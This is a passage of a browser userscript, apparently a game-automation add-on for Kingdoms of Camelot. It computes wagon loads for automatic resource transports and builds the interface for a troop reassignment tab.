		if (trade_Astone > 0 && (carry_Astone > trade_Astone)) carry_Astone = parseIntNan(trade_Astone);
		carry_Astone *= 5; //Multiply by 5 to account for 5 times less carrying capacity
      
      if (t.tradeRoutes[count]['TroopType'] == undefined) var wagons = parseInt(Seed.units[cityID]['unt'+ 9]); 
      else var wagons =  parseInt(Seed.units[cityID][t.tradeRoutes[count]['TroopType']]);
      var rallypointlevel = t.getRallypoint(cityID);	
		  if (rallypointlevel == 11) rallypointlevel = 15;
		  if (rallypointlevel == 12) rallypointlevel = 20;
    	if (parseInt(wagons) > parseInt(rallypointlevel*10000)){ wagons = (rallypointlevel*10000); }
    	
      if (t.tradeRoutes[count]['TroopType'] == undefined) var unit = 'unt9';
      else var unit = t.tradeRoutes[count]['TroopType'];
      var Troops = parseInt(Seed.units[cityID][unit]);
	  if(parseInt(Troops)>parseInt(wagons)) Troops = wagons;
      var featherweight = parseInt(Seed.tech.tch10);
    	var Load = parseInt(unsafeWindow.unitstats[unit]['5'])
      var maxloadperwagon = (featherweight * ((Load/100)*10)) + Load;
		  var maxload = (maxloadperwagon * Troops);
		  if(wagons <= 0) {return; }

	   	for (var t=0; t< Seed.cities.length;t++) {
			   if ( parseInt(Seed.cities[t][0]) == city) var cityname = Seed.cities[t][1];
		  }                     
		
		  var shift_Food = parseIntNan(maxload / 9); //Total of 9 portions
		  var shift_Wood = parseIntNan(maxload / 9);
		  var shift_Stone = parseIntNan(maxload / 9);
		  var shift_Ore = parseIntNan(maxload / 9);
		  var shift_Astone = parseIntNan(maxload / 9 * 5); //Aetherstone takes 5 of 9 portions	
		  if ((maxload - carry_Food - carry_Wood - carry_Stone - carry_Ore - carry_Astone) < 0){
			 var shift_num=0;
			 var shift_spare=0;
			
			if (carry_Food < shift_Food) { // Check: See if load/4 is to big for some resources...
				shift_spare += (shift_Food - carry_Food);
				shift_Food = carry_Food;
			}
			if (carry_Wood < shift_Wood) {
				shift_spare += (shift_Wood - carry_Wood);
				shift_Wood = carry_Wood;	
			}
			if (carry_Stone < shift_Stone) {
				shift_spare += (shift_Stone - carry_Stone);
				shift_Stone = carry_Stone;
			}
			if (carry_Ore < shift_Ore) {
				shift_spare += (shift_Ore - carry_Ore);
				shift_Ore = carry_Ore;
			}
            if (carry_Astone < shift_Astone) {
				shift_spare += (shift_Astone - carry_Astone);
				shift_Astone = carry_Astone;
			}						
			 
		  while (shift_spare >1) {
				 if (carry_Food < (shift_Food + shift_spare)){
				    shift_spare = shift_spare - carry_Food;;
				    shift_Food = carry_Food;
				 }
				 else{
				  shift_Food = (shift_Food + shift_spare);
				  shift_spare = shift_spare- shift_spare;
				}
				 if (carry_Wood < (shift_Wood + shift_spare)){
				    shift_spare = shift_spare - carry_Wood;;
				    shift_Wood = carry_Wood;
				 }
				 else{
				  shift_Wood = shift_Wood + shift_spare;
				  shift_spare = shift_spare- shift_spare;
				}
        		if (carry_Stone < (shift_Stone + shift_spare)){
				    shift_spare = shift_spare - carry_Stone;
				    shift_Stone = carry_Stone;
				 }
				 else{
				  shift_Stone = shift_Stone + shift_spare;
				  shift_spare = shift_spare- shift_spare;
				}
				 if (carry_Ore < (shift_Ore + shift_spare)){
				    shift_spare = shift_spare - carry_Ore;
				    shift_Ore = carry_Ore;
				 }
				 else{
				  shift_Ore = shift_Ore + shift_spare;
				  shift_spare = shift_spare- shift_spare;
				}
				if (carry_Astone < (shift_Astone + shift_spare)){
				    shift_spare = shift_spare - carry_Astone;
				    shift_Astone = carry_Astone;
				 }
				 else{
				  shift_Astone = shift_Astone + shift_spare;
				  shift_spare = shift_spare- shift_spare;
				}
			 }

		carry_Food = shift_Food;
		carry_Wood = shift_Wood;
		carry_Stone = shift_Stone;
		carry_Ore = shift_Ore;
		carry_Astone = shift_Astone;
		}
		
		if (maxload > (carry_Food + carry_Wood + carry_Stone + carry_Ore + carry_Astone) && ship_Gold==true) {
		    if ((maxload-(carry_Food + carry_Wood + carry_Stone + carry_Ore + carry_Astone)) > (citymax_Gold - target_Gold)){
		    	  carry_Gold = (citymax_Gold - target_Gold);
		    	  if (carry_Gold < 0 ) carry_Gold = 0;
		   	}
		    else carry_Gold = (maxload-(carry_Food + carry_Wood + carry_Stone + carry_Ore + carry_Astone));
		    if (trade_Gold > 0 && (carry_Gold > trade_Gold)) carry_Gold = parseInt(trade_Gold);
		}
		
		wagons_needed = ((carry_Food + carry_Wood + carry_Stone + carry_Ore + carry_Astone + carry_Gold) / maxloadperwagon);
		wagons_needed = wagons_needed.toFixed(0);	
		if (wagons_needed < ((carry_Food + carry_Wood + carry_Stone + carry_Ore + carry_Astone + carry_Gold) / maxloadperwagon)) wagons_needed++;	
		if ( wagons_needed < Options.minwagons ) { if(DEBUG_TRACE) logit('Small transport skipped'); return; }
        
		params.cid= city;
		params.type = "1";
		params.xcoord = xcoord;
		params.ycoord = ycoord;
		params.r1 = carry_Food;
		params.r2 = carry_Wood;
		params.r3 = carry_Stone;
		params.r4 = carry_Ore;
		params.r5 = parseInt(carry_Astone/5);
		params.gold = carry_Gold;
		
		switch (unit){
      case 'unt1': params.u1 = wagons_needed;break;
      case 'unt2': params.u2 = wagons_needed;break;
      case 'unt3': params.u3 = wagons_needed;break;
      case 'unt4': params.u4 = wagons_needed;break;
      case 'unt5': params.u5 = wagons_needed;break;
      case 'unt6': params.u6 = wagons_needed;break;
      case 'unt7': params.u7 = wagons_needed;break;
      case 'unt8': params.u8 = wagons_needed;break;
      case 'unt9': params.u9 = wagons_needed;break;
      case 'unt10': params.u10 = wagons_needed;break;
      case 'unt11': params.u11 = wagons_needed;break;
      case 'unt12': params.u12 = wagons_needed;break;
    }
	
if (maxload > (carry_Food + carry_Wood + carry_Stone + carry_Ore + carry_Astone) && ship_Gold==true) {
		    if ((maxload-(carry_Food + carry_Wood + carry_Stone + carry_Ore + carry_Astone)) > (citymax_Gold - target_Gold)){
			carry_Gold = (citymax_Gold - target_Gold);
			if (carry_Gold < 0 ) carry_Gold = 0;
		 }
		else carry_Gold = (maxload-(carry_Food + carry_Wood + carry_Stone + carry_Ore + carry_Astone));
		if (trade_Gold > 0 && (carry_Gold > trade_Gold)) carry_Gold = parseInt(trade_Gold);
	}
	
	wagons_needed = ((carry_Food + carry_Wood + carry_Stone + carry_Ore + carry_Astone + carry_Gold) / maxloadperwagon);
	wagons_needed = wagons_needed.toFixed(0);  
	if (wagons_needed < ((carry_Food + carry_Wood + carry_Stone + carry_Ore + carry_Astone + carry_Gold) / maxloadperwagon)) wagons_needed++;  
	if ( wagons_needed < Options.minwagons ) { if(DEBUG_TRACE) logit(''+culang.atransport+' Check: zu wenig Ressourcen!'); return; }
		
	params.cid= city;
	params.type = "1";
	params.xcoord = xcoord;
	params.ycoord = ycoord;
	params.r1 = carry_Food;
	params.r2 = carry_Wood;
	params.r3 = carry_Stone;
	params.r4 = carry_Ore;
	params.r5 = parseInt(carry_Astone)/5;
	params.gold = carry_Gold;
	switch (unit){
      case 'unt1': params.u1 = wagons_needed;break;
      case 'unt2': params.u2 = wagons_needed;break;
      case 'unt3': params.u3 = wagons_needed;break;
      case 'unt4': params.u4 = wagons_needed;break;
      case 'unt5': params.u5 = wagons_needed;break;
      case 'unt6': params.u6 = wagons_needed;break;
      case 'unt7': params.u7 = wagons_needed;break;
      case 'unt8': params.u8 = wagons_needed;break;
      case 'unt9': params.u9 = wagons_needed;break;
      case 'unt10': params.u10 = wagons_needed;break;
      case 'unt11': params.u11 = wagons_needed;break;
      case 'unt12': params.u12 = wagons_needed;break;
    }
	
	   if ((carry_Food + carry_Wood + carry_Stone + carry_Ore + carry_Astone + carry_Gold) > 0) {
		 
		 
		  new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
				  method: "post",
				  parameters: params,
				  loading: true,
				  onSuccess: function (transport) {
				  var rslt = eval("(" + transport.responseText + ")");
				  if (rslt.ok) {
				  actionLog("<b>"+culang.atransport+"</b> "+culang.from+": <b>" + cityname + "  "+culang.to+":  <b>(" + xcoord + ',' + ycoord + " ) </b>   ->    <b>"+culang.shrsupplywagon+" </b>:<span class=boldGreen> " + wagons_needed +" </span>");
				  var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
				  var ut = unixTime();
				  var unitsarr=[0,0,0,0,0,0,0,0,0,0,0,0,0];
				  for(i = 0; i <= unitsarr.length; i++){
					if(params["u"+i]){
					unitsarr[i] = params["u"+i];
					}
				  }
				  var resources=new Array();
				  resources[0] = params.gold;
				  for(i=1; i<=5; i++){
					resources[i] = params["r"+i];
				  }
				  var currentcityid = city;
				  unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, params.xcoord, params.ycoord, unitsarr, params.type, params.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
				   unsafeWindow.update_seed(rslt.updateSeed)
				   if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
				  } else {
				  actionLog('<b>'+culang.atransport+'</b> '+culang.actionTrans +' ' + cityname + ' ');
				  actionLog('<b>'+culang.atransport+'</b> '+culang.actionTrans2 +': ' + rslt.msg);
				  }
				  },
				  onFailure: function () {}
		  });
		}
  },
  
	ManualTransport: function(){
    var t = Tabs.transport;
   	if (document.getElementById ('ptcityX').value == "" || document.getElementById ('ptcityY').value == "") return;
    if ( t.TroopsNeeded > t.Troops) return;
    
   	var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    var unitType = document.getElementById('TransportTroop').value;
    var LoadUnit = (parseInt(Seed.tech.tch10) * ((parseInt(unsafeWindow.unitstats[unitType]['5'])/100)*10)) + parseInt(unsafeWindow.unitstats[unitType]['5']);
    var MaxLoad =  parseInt(Seed.units['city' + t.tcp.city.id][unitType]) * LoadUnit;
    document.getElementById ('errorSpace').innerHTML = '';
      	
	params.kid = 0;
    params.cid=  t.tcp.city.id;
	params.type = "1";
	params.xcoord = parseInt(document.getElementById ('ptcityX').value);
	params.ycoord = parseInt(document.getElementById ('ptcityY').value);
	params.r1 = parseInt(document.getElementById ('pbtradeamountFood').value);
	params.r2 = parseInt(document.getElementById ('pbtradeamountWood').value);
	params.r3 = parseInt(document.getElementById ('pbtradeamountStone').value);
	params.r4 = parseInt(document.getElementById ('pbtradeamountOre').value);
	params.r5 = parseInt(document.getElementById ('pbtradeamountAstone').value);
	params.gold = parseInt(document.getElementById ('pbtradeamountGold').value);
		
    switch (unitType){
      case 'unt1': params.u1 = parseInt(document.getElementById ('TroopsToSend').value);break;
      case 'unt2': params.u2 = parseInt(document.getElementById ('TroopsToSend').value);break;
      case 'unt3': params.u3 = parseInt(document.getElementById ('TroopsToSend').value);break;
      case 'unt4': params.u4 = parseInt(document.getElementById ('TroopsToSend').value);break;
      case 'unt5': params.u5 = parseInt(document.getElementById ('TroopsToSend').value);break;
      case 'unt6': params.u6 = parseInt(document.getElementById ('TroopsToSend').value);break;
      case 'unt7': params.u7 = parseInt(document.getElementById ('TroopsToSend').value);break;
      case 'unt8': params.u8 = parseInt(document.getElementById ('TroopsToSend').value);break;
      case 'unt9': params.u9 = parseInt(document.getElementById ('TroopsToSend').value);break;
      case 'unt10': params.u10 = parseInt(document.getElementById ('TroopsToSend').value);break;
      case 'unt11': params.u11 = parseInt(document.getElementById ('TroopsToSend').value);break;
      case 'unt12': params.u12 = parseInt(document.getElementById ('TroopsToSend').value);break;
    }
 

    if ((params.r1 + params.r2 + params.r3 + params.r4 + params.r5 + params.gold) > 0) {
                 
         new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
                  method: "post",
                  parameters: params,
                  loading: true,
                  onSuccess: function (transport) {
                  var rslt = eval("(" + transport.responseText + ")");
                  if (rslt.ok) {                  
		                  var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
		                  var ut = unixTime();
		                  var unitsarr=[0,0,0,0,0,0,0,0,0,0,0,0,0];
		                  for(i = 0; i <= unitsarr.length; i++){
		                  	if(params["u"+i]){
		                  	unitsarr[i] = params["u"+i];
		                  	}
		                  }
		                  var resources=new Array();
		                  resources[0] = params.gold;
		                  for(i=1; i<=5; i++){
		                  	resources[i] = params["r"+i];
		                  }
		                  var currentcityid = t.tcp.city.id;
		                  unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, params.xcoord, params.ycoord, unitsarr, params.type, params.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
		                  if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
		                  document.getElementById ('errorSpace').innerHTML = '<b>'+culang.transport+'</b>: <span class=boldGreen>' + addCommas(params.r1+params.r2+params.r3+params.r4+params.r5+params.gold) + ' </span> '+culang.res+' '+culang.SThelpwith+' <span class=boldRed>' + addCommas(parseInt(document.getElementById ('TroopsToSend').value)) + '</span> ' + unsafeWindow.unitcost[unitType][0];
		                  document.getElementById ('pbtradeamountFood').value = 0;
		                  document.getElementById ('pbtradeamountWood').value = 0;
		                  document.getElementById ('pbtradeamountStone').value = 0;
		                  document.getElementById ('pbtradeamountOre').value = 0;
						  document.getElementById ('pbtradeamountAstone').value = 0;
		                  document.getElementById ('pbtradeamountGold').value = 0;
		                  document.getElementById ('TroopsToSend').value = 0;
                  } else {
		                  var errorcode = 'err_' + rslt.error_code;
		                  if (rlst.msg == undefined)document.getElementById ('errorSpace').innerHTML = '<HR><FONT COLOR=red>'+culang.error+': ' + unsafeWindow.g_js_strings.errorcode[errorcode] +'</font>';
		                  else document.getElementById ('errorSpace').innerHTML = '<HR><FONT COLOR=red>'+culang.error+': ' + rslt.msg +'</font>'; 
                  }
                  },
                  onFailure: function () {}
          });
        }
	},
  show: function(){
	var t = Tabs.transport;
	clearTimeout (t.timer);
	t.updateTroops();
	t.updateResources();
	t.timer = setTimeout (t.show, 1000);
	 mainPop.div.style.width = 750 + 'px';
   if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
	},
  hide: function(){
		var t = Tabs.transport;
		 mainPop.div.style.width = 750 + 'px';
   if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
   clearTimeout (t.timer);
	},
	onUnload: function(){
		var t = Tabs.transport;
		if (!ResetAll) t.saveTradeRoutes();
		if (!ResetAll) t.saveTraderState();
		
	},
}
/***********************************************************************************/
/************ KOC POWER - TABS REASSIGN *******************************************/
/*********************************************************************************/
var troops = { 1:'u1', 2:'u2', 3:'u3', 4:'u4', 5:'u5', 6:'u6', 7:'u7', 8:'u8', 9:'u9', 10:'u10', 11:'u11', 12:'u12', };  
Tabs.Reassign = {
  tabLabel: culang.autoreassign,
  tabOrder: StyleOptions.toTruppen,
  myDiv: null,
  timer: null,
  reassignState: [],
  lRE: [],
  reassignRoutes: [],
  rallypointlevel:null,
  count:0,
  check:false,

  init: function(div){
  var t = Tabs.Reassign;
	t.myDiv = div;
	t.reassignState = {      running: false,    };
	t.readReassignState();
	t.readReassignRoutes();
	t.e_reassignRoutes();
	var rownum = 0;
  
function _row (name, row, noTotal){
          if (rownum++ % 2)
            style = '';
          else
            style = ' style = "background: #e8e8e8"';
          var tot = 0;
          var m = [];
          m.push ('<TR style="background: #fff" align=right');
          m.push (style);
          m.push ('><TD');
          m.push (style);
          m.push ('><B>');
          m.push (name);
          m.push ('</td>');
          if (noTotal){
            m.push ('<TD');
            m.push (style);
            m.push ('>&nbsp;</td>');
          } else {
            for (i=0; i<row.length; i++)
              tot += row[i];
            m.push ('<TD style="background: #ffc">');
            m.push (addCommas(tot));
            m.push ('</td>');
          }
          for (i=0; i<row.length; i++){
            m.push ('<TD');
            m.push (style);
            m.push ('>');
            m.push (addCommas(row[i]));
            m.push ('</td>');
          }
          m.push ('</tr>');
          return m.join('');
    }
	
    var m = '<DIV id=pbReMainDivF class=pdxStat>'+culang.Hreassign+' - '+culang.Hsettings+'</div><TABLE id=pbtraderfunctions width=100% height=0% class=pdxTab><TR align="center">';
    if (t.reassignState.running == false) {
      m += '<TD><INPUT id=pbReassignState type=submit value="'+culang.autoreassign+' = '+culang.buttonoff+'"></td>';
    } else {
      m += '<TD><INPUT id=pbReassignState type=submit value="'+culang.autoreassign+' = '+culang.buttonon+'"></td>';
    }
    m += '<TD><INPUT id=pbReassShowRoutes type=submit value="'+culang.tsroutes+'"></td>';
	m += '</tr></table><BR>'+culang.reassigntrpchk+' <INPUT id=pbreassigninterval type=text size=2 value="'+Options.reassigninterval+'"\> '+culang.reassigntrpchk2+'';
    m += '</div>';

    m += '<DIV id=pbReassignDivD class=pdxStat>'+culang.HreasRoute+'</div>';
    m += '<TABLE id=pbaddreasignroute width=95% height=0% class=pdxTab><TR align="left">';
    m += '<TD width=20px><b>'+culang.heiligtum+'</b>:</td> <TD width=310px><DIV style="margin-bottom:10px;"><span id=ptassigncity></span></div></td></tr>';
    m += '<TR align="left">';
    m += '<TD width=20px><b>'+culang.bunker+'</b>:</td> <TD width=310px><DIV style="margin-bottom:10px;"><span id=ptassigncityTo></span></div></td>';
    m += '<TR align="left">';
    m += '</tr></table>';
	m += '<TR><TD><INPUT id=autofilloff type=checkbox unchecked=true\> '+culang.reassigntrplock+'</TR></TD></table>';     
	m += '<BR><TD colspan=4><span style=\"font-size:10px; color:#555; line-height:18px; \"><b><u><font color=#600000>'+culang.impo+'</font></b></u>: '+culang.reassignimpnote+'</span></td></tr></table>';
    m += '<TABLE id=pbaddreasignroute width=100% height=0% class=pdxTab><TR align="center">';
    
    m += '<TR><TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_1_50_s34.jpg"></td>';
    m += '<TD>'+culang.supplytroop+'</td>';
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_2_50_s34.jpg"></td>';
    m += '<TD>'+culang.militiaman+'</td>';
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_3_50_s34.jpg"></td>';
    m += '<TD>'+culang.scout+'</td>';
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_4_50_s34.jpg"></td>';
    m += '<TD>'+culang.pikeman+'</td></tr>';
    m += '<TR><TD><INPUT id=pb'+troops[1]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[1]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[2]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[2]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[3]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[3]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[4]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[4]+' disabled=true type=text size=10 maxlength=10 value="0"\></td></tr>';
    
    m += '<TR><TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_5_50_s34.jpg"></td>';
    m += '<TD>'+culang.swordsman+'</td>'
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_6_50_s34.jpg"></td>'
    m += '<TD>'+culang.archer+'</td>'
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_7_50_s34.jpg"></td>'
    m += '<TD>'+culang.cavalry+'</td>'
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_8_50_s34.jpg"></td>'
    m += '<TD>'+culang.heavycavalry+'</td></tr>'
    m += '<TR><TD><INPUT id=pb'+troops[5]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[5]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[6]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[6]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[7]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[7]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[8]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[8]+' disabled=true type=text size=10 maxlength=10 value="0"\></td></tr>';
    
    m += '<TR><TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_9_50_s34.jpg"></td>';
    m += '<TD>'+culang.supplywagon+'</td>'
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_10_50_s34.jpg"></td>'
    m += '<TD>'+culang.ballista+'</td>'
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_11_50_s34.jpg"></td>'
    m += '<TD>'+culang.batteringram+'</td>'
    m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_12_50_s34.jpg"></td>'
    m += '<TD>'+culang.catapult+'</td></tr>'
    m += '<TR><TD><INPUT id=pb'+troops[9]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[9]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[10]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[10]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[11]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[11]+' disabled=true type=text size=10 maxlength=10 value="0"\></td>';
    m += '<TD><INPUT id=pb'+troops[12]+' type=checkbox unchecked=true\>';
    m += '<INPUT id=pbtarget'+troops[12]+' disabled=true type=text size=10 maxlength=10 value="0"\></td></tr></table>';
    m += '<DIV style="text-align:center; margin-top:15px"><INPUT id=pbSaveRouteReassign type=submit value="Route '+culang.add+'">';	
	m +='<DIV class=pdxStat>'+culang.Htroops+'</div><div id=reassignTrpStats></div></div>';
    
    t.myDiv.innerHTML = m;
    t.reassignTrpStats = document.getElementById ('reassignTrpStats');
	
    t.tcp = new CdispCityPicker ('ptreassign', document.getElementById('ptassigncity'), true, t.clickCitySelect, 0);
  for(var k in troops){
    document.getElementById('pbtarget'+troops[k]).value = parseInt(Seed.units['city' + t.tcp.city.id]['unt'+k]);
  }
    t.tcpto = new CdispCityPicker ('ptreassignTo', document.getElementById('ptassigncityTo'), true, t.clickCitySelect).bindToXYboxes(document.getElementById ('ptcityX'), document.getElementById ('ptcityY'));

    rows = [];
    rows[0]=[];
    m = "<TABLE class=pdxTabLined cellspacing=0><TR valign=top align=right><TD width=65></td><TD width=88 style='background: #ffc'><B>"+culang.Htotal+"</b></td>";
    for(i=0; i<Cities.numCities; i++) {
             m += '<TD width=81><B>'+ Cities.cities[i].name.substring(0,10) +'</b></td>';
    }
    for (r=1; r<13; r++){
            rows[r] = [];
            for(i=0; i<Cities.numCities; i++) {
              cityID = 'city'+ Cities.cities[i].id;
              rows[r][i] = parseInt(Seed.units[cityID]['unt'+r]);
            }
    }
    for (r=1; r<13; r++){
     m += _row ('<img height=20 title="'+unsafeWindow.unitcost['unt'+r][0]+'" src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_'+r+'_50_s34.jpg>', rows[r]);
    }
    m += "</table>";
    t.reassignTrpStats.innerHTML = m;   
	
    document.getElementById('ptassigncity').addEventListener('click', function(){
	  if(document.getElementById('autofilloff').checked == false)
	  for(var k in troops)
		document.getElementById('pbtarget'+troops[k]).value = parseInt(Seed.units['city' + t.tcp.city.id]['unt'+k]);
	  }, false);
    
    document.getElementById('pbReassignState').addEventListener('click', function(){
    t.toggleReassignState(this);
    }, false);
    document.getElementById('pbSaveRouteReassign').addEventListener('click', function(){
    t.addReassignRoute();
    }, false);
    document.getElementById('pbReassShowRoutes').addEventListener('click', function(){
    t.showReassignRoutes();
    }, false);
    
    document.getElementById('pbreassigninterval').addEventListener('keyup', function(){
  if (isNaN(this.value)){ this.value=0;};
  Options.reassigninterval = this.value;
  saveOptions();
    }, false);
  	for(var i in troops) {t.addlistens(i);	};
    window.addEventListener('unload', t.onUnload, false);
  },

    getRallypoint: function(cityId){
      var t = Tabs.Reassign;
      for (var o in Seed.buildings[cityId]){
		var buildingType = parseInt(Seed.buildings[cityId][o][0]);
		var buildingLevel = parseInt(Seed.buildings[cityId][o][1]);
		if (buildingType == 12) t.rallypointlevel=parseInt(buildingLevel);
	   }  
	},
      
addlistens: function(i){
		document.getElementById('pbtarget'+troops[i]).addEventListener('keyup', function(){if (isNaN(this.value)) this.value=0 ;}, false);
		document.getElementById('pb'+troops[i]).addEventListener('click', function(){if (this.checked==false) {document.getElementById( 'pbtarget'+troops[i]).disabled = true;} else {document.getElementById( 'pbtarget'+troops[i]).disabled = false;}},false);
},
 e_reassignRoutes: function(){
    var t = Tabs.Reassign;
    var now = new Date();
    if (t.reassignState.running == true)    {
    var now = new Date().getTime()/1000.0;
    now = now.toFixed(0);
    var last = Options.lastreassign;
       if ( now > (parseInt(last) + (Options.reassigninterval*60))){
      t.checkdoReassign();
      }
    }
    setTimeout(function(){ t.e_reassignRoutes();}, Options.reassigninterval*1000);
    
  },
      
  delReassignRoutes: function() {
    
  var t = Tabs.Reassign;
    
  t.reassignRoutes= [];
  
  },
  addReassignRoute: function () {
  var t = Tabs.Reassign;
  var city = t.tcp.city.id;
  
  if (document.getElementById('ptcityX').value==0 && document.getElementById('ptcityY').value ==0)
  {
    new CdialogCancelContinue ('<SPAN class=boldRed>'+culang.reassign00+'</span>', null, unsafeWindow.modal_attack_check, document.getElementById('pbReMainDivF'));
    return;
  }
  var Sendu1 = document.getElementById('pb'+troops[1]).checked;
  var Sendu2 = document.getElementById('pb'+troops[2]).checked;
  var Sendu3 = document.getElementById('pb'+troops[3]).checked;
  var Sendu4 = document.getElementById('pb'+troops[4]).checked;
  var Sendu5 = document.getElementById('pb'+troops[5]).checked;
  var Sendu6 = document.getElementById('pb'+troops[6]).checked;
  var Sendu7 = document.getElementById('pb'+troops[7]).checked;
  var Sendu8 = document.getElementById('pb'+troops[8]).checked;
  var Sendu9 = document.getElementById('pb'+troops[9]).checked;
  var Sendu10 = document.getElementById('pb'+troops[10]).checked;
  var Sendu11 = document.getElementById('pb'+troops[11]).checked;
  var Sendu12 = document.getElementById('pb'+troops[12]).checked;
  
  var u1 = document.getElementById('pbtarget'+troops[1]).value;
  var u2 = document.getElementById('pbtarget'+troops[2]).value;
  var u3 = document.getElementById('pbtarget'+troops[3]).value;
  var u4 = document.getElementById('pbtarget'+troops[4]).value;
  var u5 = document.getElementById('pbtarget'+troops[5]).value;
  var u6 = document.getElementById('pbtarget'+troops[6]).value;
  var u7 = document.getElementById('pbtarget'+troops[7]).value;
  var u8 = document.getElementById('pbtarget'+troops[8]).value;
  var u9 = document.getElementById('pbtarget'+troops[9]).value;
  var u10 = document.getElementById('pbtarget'+troops[10]).value;
  var u11 = document.getElementById('pbtarget'+troops[11]).value;
  var u12 = document.getElementById('pbtarget'+troops[12]).value;
  var target_x = document.getElementById('ptcityX').value;
  var target_y = document.getElementById('ptcityY').value;
    
  var lRE = t.reassignRoutes;
    lRE.push({    city:        city,    target_x:      target_x,    target_y:      target_y,    Sendu1:  Sendu1,    u1:    u1,    Sendu2:    Sendu2,    u2:      u2,    Sendu3:      Sendu3,    u3:        u3,    Sendu4:     Sendu4,    u4:       u4,    Sendu5:    Sendu5,    u5:      u5,    Sendu6:    Sendu6,    u6:      u6,    Sendu7:     Sendu7,    u7:       u7,    Sendu8:  Sendu8,    u8:    u8,    Sendu9:  Sendu9,    u9:    u9,    Sendu10:     Sendu10,    u10:       u10,    Sendu11:  Sendu11,    u11:    u11,    Sendu12:    Sendu12,    u12:      u12,    });
  document.getElementById('pbReassignDivD').style.background ='#99FF99';
  setTimeout(function(){ (document.getElementById('pbReassignDivD').style.background =''); }, 1000);
  },
  
  showReassignRoutes: function () {
  var t = Tabs.Reassign;
  var popReassignRoutes = null;
  t.popReassignRoutes = new CPopup('pbShowTrade', 0, 0, 746, 100, true, function() {clearTimeout (1000);});
  var m = '<DIV style="max-height:660px; height:460px; overflow-y:auto"><TABLE align=center cellpadding=0 cellspacing=0 width=100% class="pbShowReassignRoutes" id="pbRoutesQueue">';       
  t.popReassignRoutes.getMainDiv().innerHTML = '</table></div>' + m;
  t.popReassignRoutes.getTopDiv().innerHTML = '<TD><div class=showBadged><center>'+culang.reassign+'</center></div></td>';
  t.paintReassignRoutes();
  t._addTabHeader();
  t.popReassignRoutes.show(true)  ;
  },
  paintReassignRoutes: function(){
      var t = Tabs.Reassign;
      var r = t.reassignRoutes;
      var cityname;
    for (var i = (r.length-1); i>=0; i--) {
    for (var y=0; y< Seed.cities.length;y++) {
      if ( parseInt(Seed.cities[y][0]) == r[i].city) var cityname = Seed.cities[y][1];
    }    
    var queueId = i;
    t._addTab(queueId,cityname, r[i].target_x, r[i].target_y, r[i].Sendu1,r[i].u1, r[i].Sendu2, r[i].u2, r[i].Sendu3, r[i].u3, r[i].Sendu4, r[i].u4, r[i].Sendu5, r[i].u5, r[i].Sendu6, r[i].u6, r[i].Sendu7, r[i].u7, r[i].Sendu8, r[i].u8, r[i].Sendu9, r[i].u9, r[i].Sendu10, r[i].u10, r[i].Sendu11, r[i].u11, r[i].Sendu12, r[i].u12);
      }
    },
  
